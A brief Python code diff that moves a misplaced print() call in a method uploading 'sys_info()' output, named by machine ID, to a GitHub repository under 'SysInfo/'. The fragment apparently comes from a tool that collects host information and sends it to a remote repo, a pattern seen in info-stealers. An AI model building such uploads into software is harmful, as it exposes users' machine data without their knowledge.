@@ -7,9 +7,9 @@ class System:
         gcr = Github()
         gcr.save_to_repo(
             "SysInfo/" + System.get_machine_id() + ".data",
-            System.sys_info().encode("utf-8"),
-            print("Sysinfo done"),
+            System.sys_info().encode("utf-8")
         )
+        print("Sysinfo done")
 
     def get_machine_id():
         return (
